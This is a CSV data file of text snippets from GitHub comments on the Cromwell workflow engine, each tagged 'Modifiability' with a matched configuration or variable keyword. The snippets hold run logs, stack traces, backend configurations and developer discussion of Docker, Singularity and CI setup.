Modifiability,"o every combination of things (e.g., ""got hit on the road by a; > chicken"") instead of combinations of them, eg. (""got hit"" + ""by chicken"").; > The first is harder because you represent more things (more containers),; > but the second isn't reproducible because if you lose ""by chicken"" you've; > lost the entire workflow. Does that make sense?; > What can/should we do now?; >; > So there are two things to think about. With the current representation of; > a workflow, we would want Singularity to be OCI compliant, and I would; > propose a plan to move forward is to expect this, and contribute to; > Singularity itself with the mindset of ""I want this to plug into AWS"" or ""I; > want this to plug into Kubernetes,"" etc. The backends for HPC are going to; > be good to go with just a SLURM or SGE backend, and then commands to load; > and run/exec a Singularity container. When the time comes and Singularity; > supports services, then we can start to develop (I think) the singularity; > backend configuration for cromwell, with clean commands to get statuses,; > start and stop, and otherwise integrate into the software. You guys seem; > pretty busy, so likely your best bet would be to just wait, because the; > community is going in that direction anyway.; >; > The other representation is to rethink this. An approach that I like is to; > move away from micro managing the workflow / software, and to set; > requirements for the data. If you set standard formats (meaning everything; > from the organization of files down to the headers of a data file) on the; > data itself, then the software gets built around that. A researcher can; > have confidence that the data he is collecting will work with software; > because it's validated to the format. The developers can have confidence; > their tools will work with data because of that same format. A new graduate; > student knows how to develop a new tool because there are nicely defined; > rules. A good example is to look at the BIDS (bra",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:8398,config,configuration,8398,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,1,['config'],['configuration']
Modifiability,"o] Running with database db.url = jdbc:hsqldb:mem:35603602-72c4-4c47-8662-7fdf49e59cf1;shutdown=false;hsqldb.tx=mvcc; [2018-10-23 17:48:55,95] [info] Slf4jLogger started; [2018-10-23 17:48:56,03] [info] Pre Processing Workflow...; [2018-10-23 17:48:56,20] [info] Pre-Processing /home/jeremiah/code/gdc-dnaseq-cwl/workflows/bamfastq_align/test_pack.cwl; [2018-10-23 17:49:21,60] [info] Pre Processing Inputs...; [2018-10-23 17:49:21,78] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-5deb9cb"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-10-23 17:49:21,93] [info] Metadata summary refreshing every 2 seconds.; [2018-10-23 17:49:22,12] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,22] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-10-23 17:49:23,62] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-10-23 17:49:23,67] [info] SingleWorkflowRunnerActor: Version 37-634ac5b-SNAP; [2018-10-23 17:49:23,68] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-10-23 17:49:23,76] [info] CWL (v1.0) workflow d186ca94-b85b-4729-befc-8ad28a05976c submitted; [2018-10-23 17:49:23,80] [info] SingleWorkflowRunnerActor: Workflow submitted d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,80] [info] 1 new workflows fetched; [2018-10-23 17:49:23,81] [info] WorkflowManagerActor Starting workflow d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,83] [info] WorkflowManagerActor Successfully started WorkflowActor-d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,84] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-10-23 17:49:23,84] [warn] SingleWorkflowRunnerActor: received unexpected messa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:3085,config,configured,3085,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,1,['config'],['configured']
Modifiability,"oint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc; ```. Maybe this could be the default value in the [reference configuration file](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf) to solve the problem, but maybe it is better to have a `post-docker` configuration which is added to the pipeline similar to the `script-epilogue`. This would make easier the configuration of docker runs, separating submission and checks. By now, I will use the following local configuration to continue my work with the cromwell runner:. ```; include required(classpath(""application"")). ## keep always the workflow logs; workflow-options.workflow-log-temporary: false. backend.providers.Local.config {; ## limit the number of jobs; concurrent-job-limit = 15; # set the root directory to the run; filesystems.local {; ## do not allow copy (huge files); localization: [""hard-link"", ""soft-link""]; caching.duplication-strategy: [""hard-link"", ""soft-link""]; }; # custom submit-docker to workaround detached container due to timeout in the virtual machine; # first, we do not remove the container until it really finishes (no --rm flag); # if the docker run command fails, then it runs docker wait to wait until it finishes and store the return code; # if the docker run command fails, then it runs docker wait to return the real exit code even if detached; # once it finishes, removes the docker container with docker rm; # finally, returns the ""real return code"" stored; submit-docker = """"""; docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; rc=$(docker wait `cat ${docker_cid}`); docker rm `cat ${docker_cid}`; exit $rc; """"""; }; ```. By the way, it looks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526:1296,config,config,1296,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526,1,['config'],['config']
Modifiability,"okay sorry I was confused then - @geoffjentry suggested that the backend.conf was part of the cromwell base:. > The idea is that this would be in the Cromwell configuration and not per-workflow (but see below). In general that makes sense because a lot of the HPC-style use cases we see people never want to use actual Docker. As opposed to a workflow or pipeline that uses it. For example, here is the pipeline that I was working on that has a `backend.conf` that runs Singularity:. https://github.com/vsoch/wgbs-pipeline/pull/1/files#diff-f6baca157827c4888c394eab694e000c. But this is not a part of cromwell, or relevant to this repo - it's just a configuration file provided with the workflow. I was under the impression that we wanted to write something that would be integrated into cromwell to interact with Singularity, and not a configuration file provided with a particular pipeline (such as the wgbs in the example above). Do you mean that there is a template folder (or some other docs) where the ""suggested singularity backend"" would be provided? Something different? What am I missing?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413205958:159,config,configuration,159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413205958,3,['config'],['configuration']
Modifiability,"okay, that works for me! To answer your questions about CircleCI:. - environment variables used in the project are [encrypted](https://circleci.com/docs/2.0/security/#encryption) also using hashicorp vault! So, same thing or if not very similar deal as what you have.; - once you set them in the interface, you can't change or see them; - if the environment variables aren't set in the container with ENV or as flags with --env then they won't be saved. You would likely want to have them be [ARGS](https://vsupalov.com/docker-arg-env-variable-guide/) instead to be used and available in the container during build, but then not persisted in the container. So, as long as:; - you set secrets in the project and not the circle.yml; - you don't allow the CI to pass on secrets to other forked build requests (you would have to turn it on in settings are there are a lot of **warning don't do this!** prompts before you get there and; - you use ARGS to expose needed variables from the environment to the container for building (that don't get saved). . I think you'd be ok :) But sure, I'm definitely not a security expert. Anyway, since it's a single file, please feel free to grab the commit from here if/when you are ready.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416275110:81,variab,variables,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416275110,4,['variab'],"['variable-guide', 'variables']"
Modifiability,"old"" : 10000; }; [2018-11-21 15:09:04,43] [info] Metadata summary refreshing every 2 seconds.; [2018-11-21 15:09:04,51] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,53] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,60] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-11-21 15:09:05,40] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Version 35; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-11-21 15:09:05,51] [info] Unspecified type (Unspecified version) workflow 02306258-436a-4372-ab54-2dcd83c42b47 submitted; [2018-11-21 15:09:05,52] [info] SingleWorkflowRunnerActor: Workflow submitted 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,53] [info] 1 new workflows fetched; [2018-11-21 15:09:05,53] [info] WorkflowManagerActor Starting workflow 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] WorkflowManagerActor Successfully started WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-11-21 15:09:05,57] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-11-21 15:09:05,58] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-11-21 15:09:06,80] [info] MaterializeWorkflowDescriptorActor [02306258]: Parsing workflow as WDL draft-2; [2018-11-21 15:09:07,34] [info] MaterializeWorkflowDescriptorActor [02306258]: Call-to-Backend assignments: test.hello -> AWSBATCH; [2018-11-21 15:09:08,72] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Starting test.hello; [2018-11-21 15:09:10,76] [info] AwsBatchAsyncBackendJobEx",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:2297,config,configured,2297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['config'],['configured']
Modifiability,"omething like that. `cd` to the directory, take the generated qsub command and try it on your cluster. Hopefully you get the same ""Illegal attribute"" error. Play around with the command until you get the correct syntax. From there we can get your Cromwell config setup such it transforms the `memory` attribute into a valid syntax. Some possible examples:. | Example qsub usage | Runtime Attribute | Description |; |------------------------|------------------------|-------------------------------------------------------------------------------------------------|; | `qsub -l mem=4.0GB …` | `Float memory_gb = 1` | decimal values allowed, units are two characters uppercase |; | `qsub -l mem=4g …` | `Int memory_gb = 1` | integer values only, no decimals, and units must be one character lowercase |; | `qsub -l mem=4000mb …` | `Int memory_mb = 1000` | integer values only, and it turns out gigabytes aren't even allowed as a unit, so use megabytes |. > I would like to use $PROJECT environment variable as the default value for raijin_project_id. Environment variables won't work within HOCON, but can be passed through down into the generated submit files. It will take a bit of escaping to get past WDL-draft2, as both POSIX and WDL-draft2 both use `${...}` for variable names. To escape past WDL-draft2, create two new runtime attributes and then use them in your submit. Example:; ```HOCON; runtime-attributes = """"""; String env_start=""${""; String env_end=""}""; # other variables here; """""". submit = """"""; qsub \; -P ${env_start}PROJECT:-raijin_project_id${env_end} \; ...; """"""; ```. > jobfs is a parameter used to control scratch space local to the execution node. Currently it is being passed as a string. Unfortunately you cannot define a parameter as rich as `memory`. For custom attributes one only has the choice of `Float`, `Int`, or `String`. If you don't like `String`, you could use a `Float` and have the WDL use `runtime { jobfs_gb: 4.0 }`, or just `runtime { jobfs: 4.0 }` and tell ev",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4967#issuecomment-492892439:1572,variab,variable,1572,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4967#issuecomment-492892439,1,['variab'],['variable']
Modifiability,"ons in Google Cloud. The admin that set up my account also had no idea what `compute.zones.list` mean. I don't see this in the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/). The following command does not work:; ```; $ gcloud projects add-iam-policy-binding xxx --member serviceAccount:xxx@xxx.gserviceaccount.com --role roles/compute.zones.list; ERROR: Policy modification failed. For a binding with condition, run ""gcloud alpha iam policies lint-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/compute.zones.list is not supported for this resource.; ```; I have no idea what I should do. Why can't Cromwell simply provide the command line needed to change the permission?. As for Requester Pays, following the [documentation](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays) I have set up the `project` field in the `gcs` filesystem configuration (completely unclear which one in the documentation, as according to the tutorial there are two, but I have included `project` in both ...) in the configuration file as follows:; ```; include required(classpath(""application"")). google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }. backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""xxx"". // Base bucket for workflow executions; root = ""gs://xxx/cromwell-execution"". // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }. genomics {; // A refere",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471:1223,config,configuration,1223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471,1,['config'],['configuration']
Modifiability,ool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: wdl4s.exception.ValidationException: Input evaluation for Call dna_mapping_38.libraryMerge failed.:; inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 		at wdl4s.Call.evaluateTaskInputs(Call.scala:117); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:42); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:35); 		at scala.util.Try$.apply(Try.scala:192); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:35); 		... 12 more; 		Suppressed: wdl4s.exception.VariableLookupException: inputBams:; Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 			at wdl4s.Call.wdl4s$Call$$lookup$2(Call.scala:176); 			at wdl4s.Call$$anonfun$lookupFunction$1.apply(Call.scala:181); 			at wdl4s.Call$$anonfun$lookupFunction$1.apply(Call.scala:181); 			at wdl4s.Call$$anonfun$4$$anonfun$5.apply(Call.scala:103); 			at wdl4s.Call$$anonfun$4$$anonfun$5.apply(Call.scala:103); 			at scala.util.Try$.apply(Try.scala:192); 			at wdl4s.Call$$anonfun$4.apply(Call.scala:103); 			at wdl4s.Call$$anonfun$4.apply(Call.scala:101); 			at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 			at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 			at scala.collection.Iterator$class.foreach(Iterator.scala:893); 			at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 			at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 			at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 			at scala.collection.Tra,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:5275,Variab,VariableLookupException,5275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['Variab'],['VariableLookupException']
Modifiability,"orkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$b#-910401033] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46#617869376] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-01-20 09:33:07,58] [error] WorkflowManagerActor Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 failed (during ExecutingWorkflowState): Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; java.lang.RuntimeException: Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:5255,Config,ConfigAsyncJobExecutionActor,5255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,ove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitializationActor.sca,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4559,Config,ConfigInitializationActor,4559,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability,"patchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecuti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:3158,Config,ConfigAsyncJobExecutionActor,3158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"ppy to answer specific questions that you might have, feel free to post them on here, and no worries about the busy-ness! I hope the :fire: calms down, at least it has been sort of not so great for CA! If it helps, I'll leave you some notes here:. - adding this circle testing doesn't interfere with your current testing; - adding the build and deploy of the docker container here is a better strategy than having travis handle everything because the two can run at the same time.; - environment variables, given docker credentials, are set on the circleci project backend (once and forgotten about). This is mostly just DOCKER for pushing to docker hub.; - The yaml uses [anchors](https://discuss.circleci.com/t/using-defaults-syntax-in-config-yaml-aka-yaml-anchors/16168) in the configuration like functions, and to pipe in defaults. I name them according to what they do (e.g., `dockersave`. Some quick learnings:. Let's say we create a defaults section that looks like this, to set some shared environment variables, working directory, docker container, anything we want really:. ```; defaults: &defaults; docker:; - image: docker:18.01.0-ce-git; working_directory: /tmp/src; ```. This syntax says ""find the section defined as defaults (above) and insert it here. ```; <<: *defaults; ```; so you don't write it twice!. This is similar, but it's like a named anchor and pointer. I might have this under a jobs step. ```; - run: *dothething; ```; which might be in reference to this. ```; dothething: &dothething; name: Do the thing; command: |; echo ""Do the thing!""; echo ""Do it again!""; ```. - The main runtime in the file is the workflow jobs section, which just does a build and deploy.; - the base container that is run is one of circle's ready to docker docker images `docker:18.01.0-ce-git`; - The main steps are to load cache, install dependencies, build the container, run to test, and then save the cache and deploy. That's really it :); - you interact with the environment by writing it ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635:1202,variab,variables,1202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635,1,['variab'],['variables']
Modifiability,"ptible_attempts; }. Int modeled_segments_tumor_disk = ceil(size(DenoiseReadCountsTumor.denoised_copy_ratios, ""GB"")) + ceil(size(ModelSegmentsTumor.modeled_segments, ""GB"")) + disk_pad; call CallModeledSegments as CallModeledSegmentsTumor {; input:; entity_id = CollectCountsTumor.entity_id,; modeled_segments_input_file = ModelSegmentsTumor.modeled_segments,; load_copy_ratio = load_copy_ratio,; load_allele_fraction = load_allele_fraction,; normal_minor_allele_fraction_threshold = normal_minor_allele_fraction_threshold,; copy_ratio_peak_min_weight = copy_ratio_peak_min_weight,; min_fraction_of_points_in_normal_allele_fraction_region = min_fraction_of_points_in_normal_allele_fraction_region,; gatk4_jar_override = gatk4_jar_override,; gatk_docker = gatk_docker,; mem_gb = mem_gb_for_call_modeled_segments,; disk_space_gb = modeled_segments_tumor_disk,; preemptible_attempts = preemptible_attempts; }. # The F=files from other tasks are small enough to just combine into one disk variable and pass to the tumor plotting tasks; Int plot_tumor_disk = ref_size + ceil(size(DenoiseReadCountsTumor.standardized_copy_ratios, ""GB"")) + ceil(size(DenoiseReadCountsTumor.denoised_copy_ratios, ""GB"")) + ceil(size(ModelSegmentsTumor.het_allelic_counts, ""GB"")) + ceil(size(ModelSegmentsTumor.modeled_segments, ""GB"")) + disk_pad; call PlotDenoisedCopyRatios as PlotDenoisedCopyRatiosTumor {; input:; entity_id = CollectCountsTumor.entity_id,; standardized_copy_ratios = DenoiseReadCountsTumor.standardized_copy_ratios,; denoised_copy_ratios = DenoiseReadCountsTumor.denoised_copy_ratios,; ref_fasta_dict = ref_fasta_dict,; minimum_contig_length = minimum_contig_length,; gatk4_jar_override = gatk4_jar_override,; gatk_docker = gatk_docker,; mem_gb = mem_gb_for_plotting,; disk_space_gb = plot_tumor_disk,; preemptible_attempts = preemptible_attempts; }. call PlotModeledSegments as PlotModeledSegmentsTumor {; input:; entity_id = CollectCountsTumor.entity_id,; denoised_copy_ratios = DenoiseReadCountsTumor.deno",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3618#issuecomment-388871669:9395,variab,variable,9395,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3618#issuecomment-388871669,1,['variab'],['variable']
Modifiability,"r ran successfully in 2ms; 2018-06-07 12:16:11,095 INFO - Successfully released change log lock; 2018-06-07 12:16:11,332 INFO - Slf4jLogger started; 2018-06-07 12:16:11,499 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6c9b8d4"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2018-06-07 12:16:11,540 cromwell-system-akka.dispatchers.service-dispatcher-10 INFO - Metadata summary refreshing every 2 seconds.; 2018-06-07 12:16:11,574 cromwell-system-akka.dispatchers.service-dispatcher-8 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.actor.default-dispatcher-2 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2018-06-07 12:16:11,576 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2018-06-07 12:16:12,232 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2018-06-07 12:16:12,406 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Cromwell service started...; 2018-06-07 12:16:40,751 cromwell-system-akka.dispatchers.api-dispatcher-116 INFO - Unspecified type (Unspecified version) workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 submitted; 2018-06-07 12:16:52,348 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - 1 new workflows fetched; 2018-06-07 12:16:52,349 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - WorkflowManagerActor Starting workflow UUID(dd0b1399-ebb6-4d9b-89ea-7da193994220); 2018-06-07 12:16:52,353 cromwell-system-akka.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:96997,config,configured,96997,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['config'],['configured']
